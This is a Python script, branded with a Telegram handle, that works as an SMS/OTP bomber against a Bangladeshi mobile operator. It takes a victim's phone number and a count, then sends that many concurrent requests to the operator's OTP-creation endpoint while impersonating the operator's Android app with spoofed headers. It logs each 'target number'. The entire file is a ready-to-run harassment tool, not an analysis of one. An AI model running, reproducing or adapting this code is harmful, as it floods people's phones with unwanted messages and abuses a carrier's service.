import requests
import logging
import os
import threading
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def display_banner():
    banner = """
     #     #                             #####                                           
     #     # ######   ##   #####  ##### #     # #####    ##   ###### ##### ###### #####  
     #     # #       #  #  #    #   #   #       #    #  #  #  #        #   #      #    # 
     ####### #####  #    # #    #   #   #       #    # #    # #####    #   #####  #    # 
     #     # #      ###### #####    #   #       #####  ###### #        #   #      #####  
     #     # #      #    # #   #    #   #     # #   #  #    # #        #   #      #   #  
     #     # ###### #    # #    #   #    #####  #    # #    # #        #   ###### #    # 
    
                      t.me/heartcrafter
                        boyfrombd
    
    """
    print(banner)

def is_valid_msisdn(msisdn):
    return msisdn.isdigit() and len(msisdn) in [10, 11, 13]

def get_headers():
    return {
        "token": "",
        "platform": "android",
        "appname": "robi_lite",
        "locale": "en",
        "deviceid": "e602fe23371a73a6",
        "appversion": "1000004",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "20",
        "Host": "singleapp.robi.com.bd",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.0"
    }

def send_request(full_msisdn):
    headers = get_headers()
    data = {"msisdn": full_msisdn}
    try:
        response = requests.post("https://singleapp.robi.com.bd/api/v1/tokens/create_opt", headers=headers, data=data)
        response.raise_for_status()
        logging.info(f"Request successful to {full_msisdn}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")

def send_requests_concurrently(full_msisdn, amount):
    threads = []
    for _ in range(amount):
        thread = threading.Thread(target=send_request, args=(full_msisdn,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def save_log(target_number, total_count, start_time, end_time):
    log_data = f"Target Number: {target_number}, Total Count: {total_count}, Start Time: {start_time}, End Time: {end_time}\n"
    with open("logfile.txt", "a") as logfile:
        logfile.write(log_data)

def main():
    display_banner()
    
    while True:
        msisdn = input("Enter MSISDN (or type 'exit' to quit): ")
        if msisdn.lower() == 'exit':
            break

        if not is_valid_msisdn(msisdn):
            logging.error("Invalid MSISDN format.")
            continue

        amount = input("Enter amount: ")
        if not amount.isdigit():
            logging.error("Amount must be a number.")
            continue

        full_msisdn = "88" + msisdn
        amount = int(amount)

        start_time = datetime.now()
        send_requests_concurrently(full_msisdn, amount)
        end_time = datetime.now()

        save_log(full_msisdn, amount, start_time, end_time)

if __name__ == "__main__":
    main()
